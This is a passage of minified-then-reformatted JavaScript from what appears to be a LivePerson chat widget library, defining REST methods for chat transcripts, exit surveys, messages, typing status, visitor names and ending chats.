      needAuth: !0,
      requestType: "PUT",
      data: d
    });
    if (!e) {
      d = {
        email: b
      };
      e = ca.buildRequestObj({
        rel: "transcript-request",
        type: "chat",
        needAuth: !0,
        requestType: "PUT",
        data: d
      });
    }
    if (!e) return u({
      error: "requestTranscript - unable to find rel for request"
    }, "", "", "");
    e = U(e);
    e.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: e,
        response: b
      });
      if (b) {
        var c = {
          email: a.email
        };
        aa.publish({
          eventName: qa.onTranscript,
          data: c
        });
        ga.runSuccessCallback(a, c);
      }
      e = null;
    };
    e.error = function (b) {
      D(a, e, b, qa.onTranscript, "requestTranscriptEmail  - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: e,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(e);
  };
  da.getExitSurvey = function (a) {
    var b = {};
    b = lpTag.utils.validateAndExtendConfigs([{
      obj: a,
      path: oa.sAPIId,
      prop: oa.sAPIId
    }, {
      obj: a,
      type: sa.STR,
      path: oa.sName,
      prop: oa.sName
    }], b, !0);
    b = lpTag.utils.validateAndExtendConfigs([{
      obj: a,
      path: oa.engSkillId,
      prop: oa.engSkillId
    }, {
      obj: a,
      type: sa.BOOL,
      path: oa.windowSurveyEnabled,
      prop: oa.windowSurveyEnabled
    }], b);
    var c = ca.buildRequestObj({
      rel: "exit-survey",
      type: "chat",
      needAuth: !0,
      requestType: "GET",
      queryParams: b
    });
    if (!c) return u({
      error: "getExitSurvey - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      var d,
        e = ga.getPropertyFromObject(b, "body.survey");
      if (e) {
        ra.exitSurveyOn = !0;
        ba.changeKeepAliveState();
        d = {
          survey: e
        };
        aa.publish({
          eventName: qa.onExitSurvey,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      ra.exitSurveyOn = !1;
      ba.changeKeepAliveState();
      D(a, c, b, qa.onExitSurvey, "getExitSurvey  - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.submitExitSurvey = function (a) {
    var b;
    b = a.survey && a.survey.survey ? a.survey.survey : a.survey;
    if (!b) return u({
      error: "submitExitSurvey - no survey passed in"
    }, "", "", "");
    b = lpTag.utils.validateAndExtendConfigs([{
      obj: document,
      type: sa.STR,
      path: "referrer",
      prop: "chatReferrer"
    }, {
      obj: navigator,
      path: oa.UA,
      prop: oa.UA
    }], b, !0);
    var c = ca.buildRequestObj({
      rel: "exit-survey",
      type: "chat",
      needAuth: !0,
      requestType: "PUT",
      data: {
        survey: b
      }
    });
    if (!c) return u({
      error: "submitExitSurvey - unable to find rel for request"
    }, "", "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a || "",
        sentRequest: c,
        response: b
      });
      ra.exitSurveyOn = !1;
      ba.changeKeepAliveState();
      if (b) {
        var d = ga.getResponseData(b);
        aa.publish({
          eventName: qa.onSubmitExitSurvey,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onSubmitExitSurvey, "submitExitSurvey  - server error");
    };
    v(na.INFO, {
      originalRequest: a || "",
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.cancelSurvey = function () {
    ba.stopKeepAliveRequests();
  };
  da.addLine = function (a) {
    if (!a || !a.text && !a.json) return u({
      error: "No text/json to send"
    }, a, "", "");
    var b = e({
        event: {
          "@type": "line"
        }
      }, a),
      c = ca.buildRequestObj({
        rel: "events",
        needAuth: !0,
        type: "chat",
        requestType: "POST",
        data: b
      });
    if (!c) return u({
      error: "addLine - unable to find rel for request"
    }, a, "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = e({}, a);
        aa.publish({
          eventName: qa.onAddLine,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onAddLine, "addLine  - server error");
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.sendCollaboration = function (a) {
    if (!a || "string" != typeof a.command || "string" != typeof a.subType) return u({
      error: "Missing collaboration events parameters"
    }, a, "", "");
    var b = T(a),
      c = ca.buildRequestObj({
        rel: "events",
        needAuth: !0,
        type: "chat",
        requestType: "POST",
        data: {
          event: b
        }
      });
    if (!c) return u({
      error: "sendCollaboration - unable to find rel for request"
    }, a, "", "");
    c = U(c);
    c.success = function (d) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: c,
        response: d
      });
      if (d) {
        b.info && (b.info = S(b.info));
        aa.publish({
          eventName: qa.onSendCollaboration,
          data: b
        });
        ga.runSuccessCallback(a, b);
      }
      c = null;
    };
    c.error = function (b) {
      D(a, c, b, qa.onSendCollaboration, "sendCollaboration  - server error");
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.setVisitorTyping = function (a) {
    if (!a) return u({
      error: "No object data passed"
    }, "", "", "");
    if (typeof a.typing !== sa.BOOL || a.typing === ra.typing) return u({
      error: "setVisitorTyping typing status missing, not a boolean or unchanged from previous update"
    }, a, "", "");
    ra.typing = a.typing;
    var b = ca.buildRequestObj({
      rel: "visitor-typing",
      needAuth: !0,
      type: "visitor",
      requestType: "PUT",
      data: {
        visitorTyping: a.typing ? "typing" : "not-typing"
      }
    });
    if (!b) return u({
      error: "setVisitorTyping - unable to find rel for request"
    }, a, "", "");
    b = U(b);
    b.success = function (c) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: b,
        response: c
      });
      if (c) {
        var d = {
          typing: a.typing
        };
        aa.publish({
          eventName: qa.onSetVisitorTyping,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      b = null;
    };
    b.error = function (c) {
      D(a, b, c, qa.onSetVisitorTyping, "setVisitorTyping  - server error");
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: b,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(b);
  };
  da.endChat = function (a) {
    var b = ca.buildRequestObj({
      rel: "events",
      type: "chat",
      needAuth: !0,
      requestType: "POST",
      data: {
        event: {
          "@type": "state",
          state: da.chatStates.ENDED
        }
      }
    });
    if (!b || !ra.chatInProgress) return u({
      error: "endChat - unable to find rel for request, or chat not active"
    }, a, "", "");
    b = U(b);
    b.success = function (c) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: b,
        response: c
      });
      if (c) {
        var d = W(da.chatStates.ENDED);
        Y(d);
        ga.runSuccessCallback(a, d);
      }
      b = null;
    };
    b.error = function (c) {
      D(a, b, c, [qa.onState], "endChat - server error");
    };
    a && a.disposeVisitor && da.disposeVisitor();
    v(na.INFO, {
      originalRequest: a,
      sentRequest: b,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(b);
  };
  da.setVisitorName = function (a) {
    if (!a) return u({
      error: "No object data passed"
    }, "", "", "");
    var b = "";
    if (typeof a.visitorName !== sa.STR || a.visitorName === ra.visitorName) return u({
      error: "setVisitorName missing visitorName or unchanged from previous update"
    }, a, "", "");
    b = ra.visitorName;
    ra.visitorName = a.visitorName;
    var c = ca.buildRequestObj({
      rel: "visitor-name",
      needAuth: !0,
      type: "visitor",
      requestType: "PUT",
      data: {
        visitorName: a.visitorName
      }
    });
    if (!c) return u({
      error: "setVisitorName - unable to find rel for request"
    }, a, "", "");
    c = U(c);
    c.success = function (b) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: c,
        response: b
      });
      if (b) {
        var d = {
          visitorName: a.visitorName
        };
        aa.publish({
          eventName: qa.onVisitorName,
          data: d
        });
        ga.runSuccessCallback(a, d);
      }
      c = null;
    };
    c.error = function (d) {
      ra.visitorName = b;
      D(a, c, d, qa.onVisitorName, "setVisitorName  - server error");
    };
    v(na.INFO, {
      originalRequest: a,
      sentRequest: c,
      response: "SENDING REQUEST"
    });
    return ia.issueCall(c);
  };
  da.getAgentTyping = function () {
    return ra.agentTyping;
  };
  da.getVisitorName = function () {
    return ra.visitorName;
  };
  da.getState = function () {
    return ra.state;
  };
  da.getAgentLoginName = function () {
    return ra.agentName;
  };
  da.getAgentId = function () {
    return ra.agentId;
  };
  da.agentPictureUrl = function () {
    return ra.agentPictureUrl;
  };
  da.getRtSessionId = function () {
    return ra.rtSessionId || null;
  };
  da.getConfig = function () {
    var a = {};
    for (var b in ta) ta.hasOwnProperty(b) && (a[b] = ta[b]);
    return a;
  };
  da.getSessionKey = function () {
    return ra.chatSessionKey;
  };
  da.setDebugMode = function (a) {
    if (typeof a === sa.BOOL) {
      Da = a;
      lpTag.utils.log.debug = a;
    }
  };
  da.unbind = function (a, b, c, d) {
    return s(a, b, c, d);
  };
  da.isCaptchaV2Supported = function () {
    return ca.hasRel("recaptcha-vesrion", {
      type: "chat"
    });
  };
  i();
  h(a);
};
lpTag.taglets.ChatOverRestAPI.prototype.chatStates = {
  CHATTING: "chatting",
  WAITING: "waiting",
  ENDED: "ended",
  RESUMING: "resume",
  UNINITIALISED: "uninitialised",
  INITIALISED: "initialised",
  NOTFOUND: "notfound",
  PAUSECHAT: "paused",
  RESUMEPAUSEDCHAT: "resumepaused"
};
lpTag.taglets.ChatOverRestAPI.prototype.connectionStates = {
  ACTIVE: "active",
  INACTIVE: "inactive"
};
lpTag.taglets.ChatOverRestAPI.prototype.lineStatuses = {
  READ: "READ",
  ACCEPT: "ACCEPT",
  ACTION: "ACTION"
};